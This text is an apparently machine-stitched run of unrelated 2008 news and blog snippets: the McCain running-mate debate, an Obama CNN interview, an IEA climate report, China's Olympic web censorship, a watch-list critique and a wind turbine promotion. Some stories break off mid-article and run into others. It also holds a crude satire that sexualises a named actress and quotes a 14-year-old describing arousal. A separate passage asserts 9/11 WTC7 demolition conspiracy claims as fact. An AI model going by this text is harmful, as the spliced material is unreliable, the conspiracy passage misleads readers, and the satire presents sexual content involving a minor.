US forces will likely have to step in to replace Georgian troops in Kut and British ones in Basra .

Prominent evangelical leaders are warning Sen. John McCain against picking former Massachusetts Gov. Mitt Romney as his running mate , saying their troops will abandon the Republican ticket on Election Day if that happens .
They say Mr. Romney lacks trust on issues such as outlawing abortion and opposing same - sex marriage and because he is a Mormon .
Opposition is particularly powerful among those who supported former Arkansas Gov. Mike Huckabee in the Republican presidential primaries earlier this year .
“ McCain and Romney would be like oil and water , ” said evangelical novelist Tim LaHaye , who supported Mr. Huckabee .
“ We are n’t against Mormonism , but Romney is not a thoroughgoing evangelical and his flip - flopping on issues is understandable in a liberal state like Massachusetts , but our people wo n’t understand that . ”
The Rev. Rob McCoy , pastor of Calvary Chapel in Thousand Oaks , Calif. , who speaks at evangelical events across the country , told The Washington Times , “ I will vote for McCain unless he does one thing .
You know what that is ?
If he puts Romney on the ticket as veep .
“ It will alienate the entire evangelical community - 62 million self - professing evangelicals in this country , half of them registered to vote , are going to be deeply saddened , ” Mr. McCoy added .
Mr. Huckabee , an ordained Southern Baptist minister , was the favorite of evangelical voters in the Republican presidential nomination contest earlier this year and won more delegates per dollar spent than any other candidate in either party .
Other well - placed Christian conservatives say that although many evangelical leaders could accept and work for a McCain - Romney ticket , Mr. Huckabee ’s supporters tend to be “ rabid ” in their views against Mr. Romney because of his faith :
They do not regard Mormonism as a Christian denomination .
The McCain campaign will say officially only that the choice has n’t been made and that the wealthy former governor of Massachusetts is just one of several options for the Republican ticket .
In conversations with The Times , several Republican officials close to the McCain campaign also played down anti-Romney sentiment among conservative evangelicals .
They cited an online poll of evangelicals by 2000 presidential primary candidate Gary Bauer that found Mr. Romney is the top vice - presidential choice of born - again Christians .
But in an interview with The Times , Mr. Bauer , who was a domestic policy adviser in the Reagan administration , described the results of his poll as more ambiguous than that .
“ In our online poll , Romney won a plurality , and Mike Huckabee ran a strong second , ” said Mr. Bauer , who also told The Times that he does not think Mr. Romney ought to be a drag on the ticket .
“ But a lot of the Huckabee supporters said if Romney is McCain ’s choice , they would bail out in November . ”
An evangelical leader who , though he has close ties to Mr. McCain , confided to The Times that polling suggests that putting Mr. Romney on the ticket likely would cost Mr. McCain 7 percent to 10 percent of the evangelical vote - enough to spell defeat for Mr. McCain in a close race with Sen.
Barack Obama , the presumptive Democratic nominee .
White evangelicals have become the Republican bedrock in recent elections , providing President Bush with 35 percent of his votes in 2004 .
Even in 2006 , white evangelicals backed Republicans overwhelmingly - by a margin of 70 percent to 28 percent .
Depending on the survey and the precise wording of the question , polls typically show that evangelical or “ born - again ” Christians make up between 30 percent and 40 percent of the U.S. population .
David Barton , a former vice president of the Republican Party of Texas , said , “ The key for Mr. McCain is to pick someone who opposes abortion but does n’t alienate any part of the general Republican voting coalition ” as Mr. Romney does .
Longtime social - conservative leaders such as Phyllis Schlafly , Phil Burress , Donald P. Hodel and Mathew Staver said earlier this month that they can rally their voters around Mr. McCain largely on the issues of abortion and the judiciary , as long as they are confident that the vice - presidential candidate is pro-life .
They are skeptical about Mr. Romney ’s views .
Mr. Barton , founder of the national pro-life group WallBuilders , said the downside for picking either Mr. Romney or Mr. Huckabee is that evangelicals still would vote for Mr. McCain on Nov. 4 - given the alternative of Mr. Obama - but not work as hard organizing and getting out the vote .
“ Romney would bring to the ticket as much enthusiasm from supporters as Huckabee would bring , but Romney ’s would be from fiscal conservatives and Huckabee ’s would be evangelicals , ” he said .
Similarly , a Huckabee choice would leave fiscal conservatives voting for Mr. McCain but otherwise sitting on their hands .
Mr. Romney has long been a successful fundraiser - a skill needed because Mr. Obama is expected to raise hundreds of millions of dollars .
Republican strategists close to the Romney camp are promoting the former presidential contender behind the scenes .
“ Romney really does n’t think he will be chosen , and that there are far better veep choices for McCain .
But in my view , Mitt checks a lot of boxes :
He ’s vetted , he ’s a Washington outsider , he ’s conservative , he ’s a proven vote - getter in Michigan , and he can raise a ton of cash fast for the McCain campaign .
He can be the economic voice for the McCain campaign , ” a conservative Republican strategist close to the Romney organization told The Times .

Lohan needs to find herself a much hotter girlfriend – and quickly , men said last night .
Lohan 's gayness was initially greeted with enthusiasm by men eager for masturbatory fantasies involving the Freaky Friday actress entwined with another stunning lesbian .
However , the early euphoria turned to anger when it was revealed Lohan 's lover was Samantha Ronson , a disc jokey and Britain 's leading David Miliband lookalike .
Wayne Hayes , a masturbator , said : " It 's a log cabin , lit only by firelight , Lohan is lying naked on a fur rug , she 's fondling her own breasts , This is good .
This is really good .
" The door opens , it 's her girlfriend – bonus !
She steps out of the shadows , she 's naked too , but oh no !
It 's the foreign secretary , with a strap - on ! "
He added : " Well , that 's ruined it .
I 'm going to have to start all over again with Cameron Diaz , Lucy Lui and a vibrating egg . "
Charlie Reeves , 14 , from Didcot , said Lohan had a responsibility to young fans who had followed her breasts since Herbie : Fully Loaded .
He said : " When she jumped up and down I got a weird feeling in my underpants and my dad made a funny noise . "
He added : " What 's wrong with a naked splash fight with Charlize Theron ?
Or smearing Nutella over Scarlett Johansson 's quivering buttocks and then having a shower together ?
Nutella only comes off if you use lots of soap , apparently . "

( CNN ) -- Sen. Barack Obama said that if he 's elected president in November , he will seek input from military commanders on the Iraq war and the fighting in Afghanistan .
Sen. Barack Obama answers questions from Larry King in a taped interview on Tuesday .
" But ultimately , the buck stops with me , " he told CNN's " Larry King Live " in a wide - ranging interview Tuesday .
" I am absolutely convinced that strategically it is time for this [ Iraq ] war to end , " Obama said , adding he believes the United States can withdraw combat troops from Iraq within 16 months while leaving " a residual force to engage in counterterrorism activities " and protect diplomats .
The senator from Illinois said the Afghanistan and Iraq conflicts have worsened because the Bush administration has emphasized war tactics more than an overall strategy .
Obama 's Republican opponent in the presidential race , Sen. John McCain , has criticized Obama for proposing plans for Iraq and Afghanistan without recent visits to either war - torn country .
But Obama said Bush and McCain " have missed consistently ... the broader strategies . "
" Was it wise to go in there ?
And what are the costs and benefits of staying there ? "
Obama said , adding that the Iraq war costs $ 10 billion each month .
" My job as commander - in - chief is to look at the whole picture . "
Obama added : " I want to bring this war to a close , but I do want to consult with our commanders on the ground to find out tactically how do we do it in a safe way and how do we make sure that the gains that have been obtained with respect to violence in Iraq are sustained . "
He said , " Perpetuating the strategy we have in Iraq is costing us elsewhere , not only in Afghanistan but also investments that we could be making here at home . "
Obama also repeated his pledge to push for the death penalty for 9/11 mastermind Osama bin Laden if he is captured .
Watch Obama talk about his plans to hunt for bin Laden »
" We want to capture him or kill him , " he said .
" And as I 've said -- as I just said this past weekend , if we captured him , then we would want to put him on trial .
And I think he would be deserving of the death penalty . "
Obama also repeated his pledge that if he were president , U.S. troops would pursue bin Laden into Pakistan if adequate intelligence suggested he was there .
The interview followed an earlier policy address on Iraq , Afghanistan and national security at the International Trade Center in Washington .
On the ongoing housing crisis , Obama seemed to give cautious approval of the government 's response to the turmoil surrounding mortgage giants Fannie Mae and Freddie Mac .
" I think some of the ideas that were offered with respect to Fannie Mae and Freddie Mac are good ones , " he said .
" I just want to make sure that we 're not bailing out shareholders and CEOs , but that we 're focused on maintaining liquidity in the housing market . "
Those comments come the same day Treasury Secretary Henry Paulson was grilled by lawmakers on Capitol Hill over his proposal to provide more government capital to the embattled mortgage firms and possibly acquire more equity in them .
Obama also addressed the New Yorker 's cover depicting him in Muslim garb and his wife as an armed militant , saying it is an unsuccessful attempt at satire that will likely fuel misconceptions he has long battled over the course of his presidential campaign .
But he downplayed the impact of the magazine 's illustration .
" It 's a cartoon ... and that 's why we 've got the First Amendment , " Obama said .
" And I think the American people are probably spending a little more time worrying about what 's happening with the banking system and the housing market , and what 's happening in Iraq and Afghanistan , than a cartoon .
So I have n't spent a lot of time thinking about it . "
" I 've seen and heard worse , " he said .
" I do think that in attempting to satirize something , they probably fueled some misconceptions about me instead .
But that was their editorial judgment . "
Watch Obama react to the magazine cover »
The cover , which also depicts a U.S. flag burning in the fireplace and a picture of bin Laden on the wall , drew heavy criticism from both political parties after it circulated on the Internet over the weekend .
Both presidential campaigns immediately condemned the magazine , calling the illustration " tasteless and offensive . "
David Remnick , the longtime editor of the publication , said Monday he believes the ironic intent of the illustration -- to satirize misconceptions about Obama -- will be clear to most Americans .
CNN 's Alexander Mooney contributed to this report .

TOKYO ( Reuters ) - World governments must quickly start a $ 45 trillion “ energy technology revolution ” that could drive up the cost of producing carbon ten - fold , or risk emissions surging by 2050 , the West ’s energy watchdog warned on Friday .
The world would need to build dozens of nuclear power plants a year and bury carbon emitted from dozens more gas and coal plants , plus cutting the carbon intensity of cars , trucks , buses and planes eightfold , to halve emissions by mid-century , the International Energy Agency said in a new report .
Without taking action on government policy , emissions would surge by 130 percent and oil demand would rise by 70 percent by 2050 , the IEA said , far beyond the level that many experts believe the world is capable of sustainably producing .
The report , commissioned by the Group of Eight three years ago , lays down the gauntlet for G8 leaders gathering in northern Japan next month , where Tokyo is expected to urge them to agree on a target of chopping greenhouse gases in half by 2050 .
“ There should be no doubt -- meeting the target of a 50 percent cut in emissions represents a formidable target .
We would require immediate policy action and technological transition on an unprecedented scale , ” Nobuo Tanaka , Executive Director of the IEA , said in a statement .
“ It will essentially require a new global energy revolution which would completely transform the way we produce and use energy ...
We need to act now . ”
The IEA said halving emissions by 2050 would require “ all options up to a cost of $ 200 per ton of CO2 ” -- and in the worst case $ 500 a ton -- giving a rare long - term forecast that suggests a sharp rise from the 27 euro ( $ 42 ) a ton price for carbon emissions rights trading in Europe .
“ You would have to see one of the biggest rises in a commodity price in history to get $ 500 a ton , ” said Tom Luckock , a lawyer with international law firm Norton Rose .
Scientists say that the world must brake and reverse annual increases in greenhouse gas emissions to avoid catastrophic climate change including rising seas and more extreme weather .
But governments are at odds over how to split the costs of funding cleaner energy technology , particularly in the developing world .
The IEA said the $ 45 trillion is equal to 1.1 percent of average annual global gross domestic product over the period .
“ Carbon emissions must be cut .
Costs of about 1 percent of GDP are not outrageous , so this target is realistic , ” said Go Hibino , a senior manager at Mizuho Information & Research Institute .
About 190 nations are racing to craft a framework by the end of 2009 to succeed the Kyoto Protocol , which binds 37 advanced nations to cut emissions by an average of 5 percent below 1990 levels by 2008 - 12 .
OIL DEMAND CURBS
The report , which comes just ahead of a G8 energy ministers meeting this weekend in Japan , highlighted the security benefits of cracking down on carbon .
“ Oil demand by 2050 would be 27 percent below the level of 2005 .
Yet massive investments in remaining reserves will be needed to make up for the shortfall as low - reserve provinces are exhausted , ” Tanaka said .
A massive research and development effort will be needed in the next 15 years costing about $ 10 billion to $ 100 billion per year to develop technology to cut CO2 emissions , the IEA said in the Energy Technology Perspectives report .
It said the power sector would need to be “ decarbonized ” by installing CO2 capture and storage ( CCS ) at 35 coal - and 20 gas - fired power plants a year from 2010 to 2050 at a cost of $ 1.5 billion each .
The sector would also need to build 32 new nuclear plants and install 17,500 wind turbines a year .
Germany ’s RWE Supply and Trading said on Wednesday that CCS , often regarded as commercially impossible , could be viable with carbon prices of less than 100 euros .
The report comes ahead of a weekend meeting of G8 energy ministers and their China , India and South Korea peers in Aomori in northern Japan , where they will try to agree on the role of consumer nations in stemming oil ’s five - year price rally .
Tanaka said non-IEA members such as China , India and other developing countries must conserve energy to achieve the target as they are already big emitters and are likely to emit more .
“ Some kind of financial facility or some scheme is needed to help developing countries participate more easily , ” Mizuho ’s Hibino said .
“ It would be hard for the IEA to achieve the goal without the participation of developing countries . ”

The European Union was last night trying to secure a ceasefire in the pro-Russian enclave .
The United States and the EU sent a joint delegation to the region in a bid to halt the fighting , while Nato called for an immediate end to the clashes and for direct talks between Russia and Georgia .
Obama VP speech to emphasize security theme at Dem Convention Nick Juliano
Published : Monday August 11 , 2008
Print This Email This Update : VP speaker 's theme shares name of Wes Clark PAC Perhaps it 's just a coincidence , but Barack Obama 's campaign and the Democratic Convention organizers seem like they might be dropping a big hint about who 's going to grab the No. 2 spot on the ticket .
The third night of the convention , Wednesday Aug. 27 , will feature a prime - time speech from Obama 's yet - to - be - named running mate .
The day 's theme is " Securing America 's Future , " which just so happens to be the name of Gen. Wesley Clark 's Political Action Committee .
An representatives of the Obama campaign and Clark 's PAC did not immediately respond to RAW STORY 's request for comment on whether this meant Clark would be the Democrat 's potential vice president , but so far it seems to be mostly coincidence :
For what it 's worth , an aide to Gen .
Clark could not restrain near - riotous laughter when asked if there was anything behind the connection .
" I do n't think it 's anything more than an interesting coincidence , " the aide said in between convulsions .
" It 's just because his PAC was named so well ! "
Still , it 's not as though the party is randomly naming each day of the convention .
The theme for Thursday , when Obama will speak , is the familiar - sounding " Change You Can Believe In . "
Coincidence or no , the Wednesday night theme has launched some speculation that Clark will show up on the ticket .
A former NATO commander , Clark ran his own brief presidential campaign in 2004 and he remains popular among progressive activists .
Observers see his national security credentials as a potential vital boost to the ticket .
Clark also has shown himself to be a capable political combatant .
He refused to cower earlier this summer when Republicans drummed up outrage over his observation that Republican nominee John McCain 's experience as a shot - down fighter pilot turned Vietnam POW did not alone make him qualified to be Commander in Chief .
Organizers of the Democratic National Convention on Monday announced themes and primetime speakers for each of the four days the party will gather to crown its nominee in two weeks .
As Time magazine 's Jay Newton - Small notes , the theme on Wednesday seems to suggest Obama will pick a running mate with strong national security credentials .
The schedule also seems to eliminate the possibility that Hillary Clinton will be the next vice president .
The former First Lady is slated for a prime - time speaking role on Tuesday night .
The Politicker 's James W. Pindell opines , " While they probably did not intend it this way , the Democratic National Committee just stated that New York Sen. Hillary Clinton will not be Barack Obama 's pick for vice president . "
Pindell notes that the schedule 's placement of Clinton on Tuesday and the veep pick on Wednesday inherently implies " [ t ] wo different people on two different nights .
This does not preclude Obama from picking Clinton anyway though it would be a little odd that a convention he is essentially running on would reverse itself in such a dramatic way . "
" From Monday through Thursday , our Convention program will highlight the people of this country who want positive change and who believe Barack Obama is the leader who will listen to their concerns and get our country moving in the right direction again , " said Kansas Gov. Kathleen Sebilius , a co-chair of the convention who is considered a top candidate herself for the No. 2 spot on the Democratic ticket .
The theme for the Aug. 25 opening night will be " One Nation , " with a speech by Michelle Obama .
The Aug. 26 theme is " Renewing America 's Promise " with a speech by Sen. Hillary Rodham Clinton , Barack Obama 's chief rival for the presidential nomination .
The theme for Aug. 28 , the night Obama formally accepts the nomination , is " Change You Can Believe In . "
Obama will speak at the 75,000 seat Invesco Field in Denver , while the rest of the convention will take place in the nearby convention center .
The convention organizing committee also announced Monday that it will be hosting an interactive town hall meeting to allow voters from around the country to submit text and videotaped questions to be answered during the convention .
" As Barack Obama has said , this is not our Convention -- this is America 's Convention , " said Governor Howard Dean , Chairman of the Democratic National Committee .
" And now , at a critical moment in our history , Americans will have their concerns addressed , challenges listened to and their questions answered live by our country 's leaders .
We want Americans to be at the center of this Convention , and ' America 's Town Hall ' will allow us to do just that . "

Those tires on your wheels may end up on your roads , thanks to a more than $ 325,000 effort to divert 21,000 waste tires from California landfills and use them to create rubberized asphalt concrete , according to the California Integrated Waste Management Board .
The waste board awarded the money last week to El Cerrito up north in Contra Costa County and Baldwin Park .
Rubberized asphalt concrete is made by blending rubber from recycled waste tires with asphalt and uses about 2,000 waste tires for ever lane mile paved .
Not only does it cut down in noise , but it resists cracking , retains its original color and can save up to $ 50,000 per lane mile compared with the standard 4 - inch thick layer of regular asphalt .
So far the waste board has provided more than $ 25 million in such grants to find new uses for the roughly 42 million waste tires generated each year in California .
About 75 % are recycled , but roughly 10 million tires remain and are often found in landfills or illegal stockpiles .
These surplus tires can be breeding grounds for mosquitoes , rodents and other pests , according to the board .
They also can pose a high fire risk , and these fires are not only hard to put out but they also create heavy smoke and toxic runoff .
Money for these grants come from the $ 1.75 recycling fee charged on each new tire sold in California .
The waste board receives $ 1 for each tire , and the rest of the money is used for tire - related air emission programs .

Mencken 's famous bathtub hoax was an invented history of the bathtub , designed to appeal to what readers wanted to believe about the ignorance and irrationality of people in the past .
He published it as a demonstration of human credulity , reported with glee on how many people repeated it as gospel despite its obvious inconsistency with easily established historical facts , published multiple retractions pointing out how obviously false it was — and , by his account , never managed to kill the story .
My previous post pointed to a modern equivalent .
The ( and , I think , the AP , but not Reuters , which got it right ) misread a GAO report in a way that drastically altered its meaning , converting it from a plausible but boring result ( a substantial majority of corporations reported no taxable income in at least one year out of an eight year period ) to a wildly implausible result that nicely fitted what a lot of people wanted to believe ( two - thirds of corporations reported no taxable income over that eight year period ) .
They simultaneously made another mistake almost as bad , calculating what the corporations " should " have owed on the basis of their revenue , not their profit .
Thediscovered the latter mistake and corrected it ; so far as I can tell , they have not yet noticed the former mistake .
Googling around , I found an enormous numbers of online references to the story .
So far , I have not found a single one , other than my piece on this blog , that spotted the mistake .
I 've posted the actual facts on a fair number of them , but it 's like a teacup in a tempest .
I have no doubt that , years from now , millions of people will still remember the scandalous , and wholly imaginary , fact from thearticle .
The recent collapse of financial giants Lehman and AIG have led to new calls for regulation .
Nobel Prize winning economist Joseph Stiglitz has proposed a six point plan to deal with the current financial situation .
He believes that the government needs to “ correct the incentives for executives ” by requiring that bonuses be paid on five year returns , rather than on annual returns .
We need a “ financial products safety commission ” .
We need a “ financial systems stability commission ” to overview the entire financial system .
We need to impose regulations like “ speed bumps ” to limit excessive lending .
We need regulation to limit predatory lending .
Finally , we need better competition laws .
Firms that are “ too big to fail ” ought to be broken up .
Absent from this list are any calls for reforming the Federal agencies that currently exist .
Professor Stiglitz insists that “ financial institutions are at the center of blame ” .
Stiglitz does admit that the Fed mismanaged policy , but makes no mention of other authorities .
The Federal Reserve created this problem with “ a flood of liquidity ” that caused a “ housing bubble ” and low household savings .
These are interesting observations .
The idea that inflationary monetary policy should cause an investment boom in housing and dearth of household savings ( i.e. a consumption boom ) that leads to a crash is highly consistent with the explanation of business cycles that earned Friedrich Hayek his Nobel Prize in economics .
Professor Stiglitz is hinting at Austrian Business Cycle Theory .
Unfortunately , professor Stiglitz has learned the wrong lessons from this experience .
He has jumped to the conclusion that private markets and “ lax regulation ” are to blame .
While it is surely the case that private investors and CEO ’s have committed errors , it could hardly be the case that Federal Regulators are blameless .
At a minimum , Federal authorities failed to prevent the current crisis .
Professor Stiglitz does note that “ the ingenuity of those in financial markets means that regulations will be circumvented .
Indeed , he admits that past regulations came to be ineffective , and uses this as an excuse for more regulation .
This supports the theory of regulation advanced by Ludwig von Mises in his 1940 book on Interventionism .
Regulations lead to unforeseen and unintended consequences that require more regulation , if we insist upon governmental controls instead of regulation by true competition .
The current crisis should be viewed as a failure of several large organizations , only some of which are private .
The difference between private failure and public failure is that , as Milton Friedman put it , “ If you start a program that is a failure and you are in the private market , the only way you can keep it going is by digging into your own pocket .
That is your bottom line .
However , if you are in the government , you have another recourse .
With perfectly good intentions and good will nobody likes to say “ I was wrong ” you can say , “ Oh , the only reason it is a failure is because we have n’t done enough ” .
This crisis is shutting down some private firms , like AIG , yet culpable public sector organizations will continue their operations , perhaps without any reforms at all .
We may also get more of these public regulatory organizations .
This is the true failure of a system , failure to reform itself .
Capitalism reforms itself through bankruptcy , but government has no such automatic mechanism for change and reform .
ON the contrary , public institutions use crises as justifications for their expansion , even where these public institutions are at least partly to blame for the crisis in question .
We can , however , learn from the recent crisis by putting it in the proper perspective .
Mises and Hayek arrived at the right answers largely because they thought about capitalism and government in evolutionary terms .
We can arrive at the rights answers to the problems of our time by thinking about them in the same way .

China has lifted blocks on several long - barred websites after criticism of their censorship .
The move , which followed overnight talks with the International Olympic Committee , means that sites including those of Amnesty International , Human Rights Watch and the BBC Chinese language service are accessible in Beijing , Shanghai and possibly further afield .
The ban had been deeply embarrassing for the IOC , which had said that journalists would have the same internet access they had enjoyed at previous Olympics .
It was initially thought that only the Olympic media centre and hotels used by journalists would have access to such sites , but they are currently visible to internet users far outside those locations .
However , sites with information on the banned spiritual movement Falun Gong , Chinese dissidents , the Tibetan government in exile and the 1989 military crackdown on the Tiananmen Square protests are still inaccessible .
The U - turn came as President Hu Jintao said his country would stand by the pledges it made in bidding for the games , in a rare interview with a select group of foreign reporters .
" The Chinese government and the Chinese people have been working in real earnest to honour the commitments made to the international community , " said Hu .
But he also warned critics against politicising the Olympics , saying it would not help to resolve contentious issues .
IOC press chief Kevan Gosper said earlier this week that some IOC officials had made a deal to let China block sensitive websites to the media , despite repeated promises of an unrestricted internet .
He said the unannounced censorship had been embarrassing for him and that Beijing organisers " could have done better " .
But yesterday he said that the IOC president , Jacques Rogge , had assured him that its stance had not changed .
" We met with Beijing organisers and the Chinese authorities yesterday and they have addressed these issues , " said an IOC spokeswoman , Emmanuelle Moreau .
Beijing Olympic spokesman Sun Weide declined to confirm that restrictions had been eased , telling reporters only that internet access was " fully open " .
" Beijing organisers will honour the promise to the IOC to provide sufficient access , " he said at a news conference .
" At the moment the channel for reporters to use the internet is fully open . "
A spokesman for Amnesty International said : " It 's good news that our site has been unblocked in Olympic venues and perhaps elsewhere in Beijing , but it is still a long way from the ' complete media freedom ' promised .
It seems public outrage has succeeded where the IOC 's ' quiet diplomacy ' had failed . "
Chinese engineers quoted in an article in the Atlantic Monthly said they had been told to prepare to unblock access for a list of specific internet protocol addresses to used by foreign visitors .
But Andrew Lih , a new media author in Beijing , said it seemed the authorities might have simply decided it was easier to lift blocks for everyone .
" It 's possible [ to block individual locations ] but would be very complicated , " he said .
Tonight CNBC will be airing a special " Your Money , Your Vote " program focusing on the economic stance of the two presidential candidates .
It 's important and definitive coverage .
But frankly , I miss Ron Paul .
( Update : Readers Respond )
Sure , he 's still technically in the race , but pragmatically , he 's out .
It 's a two - pony race now ( although we 'll no doubt see all the typical fringe candidates who appear on a presidential ballot ) .
His supporters are still active , but need to figure out their future .
Ron Paul has serious passion .
He also has some interesting ideas .
Critics have described some as off - the - wall .
Regardless , what I like is that he has some serious Internet troops .
I faced their wrath last fall when they staged a grassroots siege on one of our Web site polls after a candidate 's debate .
The Ron Paul faithful took issue with my decision to take down the poll .
Our political correspondent was ticked off too .
As with any conflict , I kind of thought it was a pain .
But you know what ?
It was a good pain .
The argument was philosophical , passionate , and relevant .
I 've had many more disagreements that were far less intriguing .
We 'll have a poll along with tonight 's special coverage too .
But I do n't expect to have any issues around it .
The candidates do n't seem to have the same Internet savvy campaign ... other than the occasional spam .

Over 600 brave Americans who were caught in the quagmire of Viet Nam were captured and held as POWs .
In most cases , they also received at least some torture .
Regardless of our view of that war , these brave people deserve respect and admiration for what they endured .
That select group includes two remarkable men , John McCain and Philip Butler , both accomplished individuals and proud American patriots , who know each other going back to their days together at the Naval Academy .
John McCain went on to a life of politics and is now the presumptive Republican nominee for president of the United States .
Philip Butler went on to complete his PhD at the University of California , San Diego , and is now a peace and justice activist with Veterans for Peace .
Dr. Butler has written a fascinating article , published on Military.com , which explains why he will not vote for his fellow POW for the presidency .
It is not an article that damns McCain .
On the contrary , in contains considerable praise .
However , what the article does accomplish is to present a snapshot the real McCain , seen as more than just a war hero or politician , but a human being .
Dr. Butler reaches the conclusion that , despite his positive qualities , McCain exhibits certain characteristics that make him unsuitable as the best choice for president of the United States .
Here are a few excerpts from the article :
Believe me when I say that back then I would never in a million or more years have dreamed that the crazy guy across the hall would someday be a Senator and candidate for President !
John was a wild man .
He was funny , with a quick wit and he was intelligent .
But he was intent on breaking every USNA regulation in our 4 inch thick USNA Regulations book .
And I believe he must have come as close to his goal as any midshipman who ever attended the Academy .
I could tell many other midshipman stories about John that year and he unbelievably managed to graduate though he spent the majority of his first class year on restriction for the stuff he did get caught doing .
In fact he barely managed to graduate , standing 5th from the bottom of his 800 man graduating class .
I and many others have speculated that the main reason he did graduate was because his father was an Admiral , and also his grandfather , both U.S. Naval Academy graduates .
I furthermore believe that having been a POW is no special qualification for being President of the United States .
The two jobs are not the same , and POW experience is not , in my opinion , something I would look for in a presidential candidate .
Most of us who survived that experience are now in our late 60’s and 70’s .
Sadly , we have died and are dying off at a greater rate than our non-POW contemporaries .
We experienced injuries and malnutrition that are coming home to roost .
So I believe John ’s age ( 73 ) and survival expectation are not good for being elected to serve as our President for 4 or more years .
I can verify that John has an infamous reputation for being a hot head .
He has a quick and explosive temper that many have experienced first hand .
Folks , quite honestly that is not the finger I want next to that red button .
John is not a religious person , but he has taken every opportunity to ally himself with some really obnoxious and crazy fundamentalist ministers lately .
I was also disappointed to see him cozy up to Bush because I know he hates that man .
He disingenuously and famously put his arm around the guy , even after Bush had intensely disrespected him with lies and slander .
So on these and many other instances , I do n’t see that John is the “ straight talk express ” he markets himself to be .
Dr. Butler summarizes as follows :
In short , I think John Sidney McCain , III is a good man , but not someone I will vote for in the upcoming election to be our President of the United States .

NIST ’s wizards of balderdash have now officially concluded that fire caused the swift , symmetrical collapse of WTC Building 7 – offering essentially no explanation at all , other than ruling out alternative explanations ( which were not scientifically tested in their research ) as not credible .
CNN ’s Wolf Blitzer reports that the WTC7 building collapse is “ mystery solved ” – showing footage of head NIST ‘ investigator ’
Dr. Shyam Sunder making claim that the 47 - story steel skycraper is the first in history of its kind to collapse ‘ mainly due to fire ’ despite the fact that NIST ’s own report– previously leaked — shows that the visible fires had all died out hours before the collapse , making it impossible for fire to be the cause .
Of course , no other explanation for the collapse was actually investigated – no tests were done in regards to the use of explosives , for instances .
However , Dr. Sunder did declare that “ alternate theories are really – none of them have been found to be credible ” ( true enough , as no such theories were ever tested ) .
Therefore , case closed ; fire to blame .
A group of tightly - controlled government scientists said so .
The CNN piece briefly features Shane Geiger , an Infowars freelance reporter , who challenged NIST ’s “ bare assertions ” – before , Geiger reported to the Alex Jones Show , NIST turned the lights out on his question .
Notice CNN quickly cuts from the ‘ conspiracy theorist ’ after only a few words because the lights were shut off shortly afterwards ( not shown in the video ) – incredibly , in the middle of Geiger ’s polite but dissenting statement .
Apparently , no defense for NIST ’s unsupported statements was available , so instead cheap distraction was used to immediately end the discussion .
A NIST video ( posted below ) gives a summary explanation of the group ’s findings in which the group basically just states that fire was the cause , states that explosions were not used because they would have been too loud , then goes into a diabtribe about skyscraper fire safety – which is just absurd and really not related to the subterfuge that actually took place on 9/11 – killing nearly 3,000 innocent people .

Congratulations to our Millionth Terrorist !
The U.S terrorist watch list has hit one million names .
I sure hope we ’re giving our millionth terrorist a prize of some sort .
Who knew that a million people are terrorists .
Why , there are only twice as many burglars in the U.S .
And fifteen times more terrorists than arsonists .
Is this idiotic , or what ?
Some people are saying fix it , but there seems to be no motivation to do so .
I ’m sure the career incentives are n’t aligned that way .
You probably get promoted by putting people on the list .
But taking someone off the list … if you ’re wrong , no matter how remote that possibility is , you can probably lose your career .
This is why in civilized societies we have a judicial system , to be an impartial arbiter between law enforcement and the accused .
But that system does n’t apply here .
Kafka would be proud .
EDITED TO ADD ( 7/16 ) : More information :
There are only 400,000 on it , and 95 percent are not U.S. “ persons . ”
( Persons = citizens plus others with a legal right to be in the U.S. )
The “ million ” number refers to records .
The difference is a result of listing several different aliases or spellings for a suspected terrorist .
“ That is not the same as 1 million names or 1 million individuals , ” Mr. Kolton said .
“ It ’s a little bit frustrating because I feel like they are getting away with muddying up the terms . ”
Not that 400,000 terrorists is any less absurd .
Screening and law enforcement agencies encountered the actual people on the watch list ( not false matches ) more than 53,000 times from December 2003 to May 2007 , according to a Government Accountability Office report last fall .
Okay , so I have a question .
How many of those 53,000 were arrested ?
Of those who were not , why not ?
How many have we taken off the list after we ’ve investigated them ?
EDITED TO ADD ( 7/17 ) : Bob Blakely runs the numbers .

Latest Selsam Wind Turbine Sets World Record !
More Rotors = More Power . 6000 Watts from a 7 foot diameter turbine .
Currently funded by The California Energy Commission
http://www.energy.ca.gov/contracts/smallgrant/2003-02-21_awards_02-02.html
U.S. Patent Numbers 6,616,402 and 6,692,230 and other patents pending including U.S. and international ( PCT ) around the world http://www.uspto.gov
5300 watts at 32.5 mph one minute average with no furling - translates to 6000 watts at sea level
Latest Data Confirms the Immense Power - Gathering Ability of the Multi-Rotor !!!
More Rotors = More Power !!!
See newly - generated power curves below :
6000 watts at 32.5 mph when corrected for sea level ( right ) .
Raw data is at left .
Sea level data are : 5400 watts at 30 mph ; 4000 watts at 25 mph , over 2000 watts at 20 mph , and over 1000 watts at 16 mph .
Data was taken at one minute averages at 5000 feet elevation at windtesting .com in Tehachapi , CA in July 2004 .
Diameter is 7 feet .
Tower height is 60 feet .
Anemometer placed at height of 3rd rotor from the front , on a separate tower about 50 feet from prototype tower .
Note that even uncorrected for sea level , we get a solid average 4000 watts at 27 mph at 5000 feet elevation .
Low windspeed performance is superb .
We get the same power at half the windspeed of a normal turbine , for the same diameter , because we have more rotors .
At the same speed , we get six ( 6 ) times the power ( ! ) , by adding six additional rotors behind the first .
Rotors are placed out of the wake of preceding rotors in order to receive fresh wind .
A total of 21 blades are well placed to receive fresh wind and turn a common generator - Total moving parts : 1
S taggeringly enhanced output , or 5 to 6 times the power , is achieved by the addition of multiple , co-axial rotors .
Here was the previous power output at a lower voltage in May 2004 :
New Selsam Monster Turbine funded by The California Energy Commission
http://www.energy.ca.gov/contracts/smallgrant/2003-02-21_awards_02-02.html
shatters world record for power output of a 7 foot diameter turbine :
5033 watts@ 31.81 mph ; 3961 watts@ 26.1 mph ; 2464 watts@ 21.19 mph ; 1943 watts@ 18.9 mph
Power Curve taken over a 12 - day period in late May , 2004 at Windtesting.com in Tehachapi , CA
1000 watts at 16 mph
2000 watts at 20 mph
3000 watts at 24 mph
4000 watts at 27 mph
5000 watts at 33 mph
3961 watts at 26.1 mph one minute average with no furling - translates to 4000 watts at 27 mph
To correct for 5000 ' altitude add ~ 13 % to yield about 4500 watts at 27 mph !
Brent Scheibel , Founder of Windtesting.com adjusts furling speed by changing gas springs .
The awesome machine reaches into the sky , grabs all the power it can , and SLAMS it into the generator !
A single 7 foot diameter rotor would not even turn this powerful generator .
The wind sees a profile of one seven foot diameter rotor at high wind speeds , extended into the third dimension .
At lower wind speeds , more swept area is exposed , at higher windspeeds , less swept area is presented to the wind .
The angle relative to the wind is automatically adjusted depending on wind speed .
